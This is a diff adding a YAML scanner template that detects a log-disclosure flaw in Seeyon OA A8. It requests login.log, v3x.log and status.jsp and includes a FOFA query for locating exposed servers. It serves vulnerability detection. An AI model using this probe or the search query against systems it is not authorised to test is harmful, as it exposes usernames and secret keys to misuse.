@@ -1,0 +1,35 @@
+id: seeyon-logs-disclosure
+
+info:
+  name: 致远OA A8 logs 信息泄露漏洞
+  author: zan8in
+  severity: medium
+  verified: true
+  description: |
+    致远OA A8-m 存在登录日志泄露, 攻击者可以从其中获取用户名、secretKey等敏感信息进一步攻击
+    fofa: app="致远互联-OA" || title="A8-m"
+  tags: seeyon,a8,disclosure
+  created: 2023/05/26
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /seeyon/logs/login.log
+    expression: response.status == 200 && response.body.bcontains(b'[Access URL]') && response.body.bcontains(b'==>')
+  r1:
+    request:
+      method: GET
+      path: /seeyon/management/status.jsp
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'Server') && 
+      response.body.bcontains(b'JVM')
+  r2:
+    request:
+      method: GET
+      path: /seeyon/logs/v3x.log
+    expression: response.status == 200 && response.body.bcontains(b'[QuartzScheduler_Worker-1]  INFO AccountDaoBean:29')
+expression: r0() || r1() || r2()
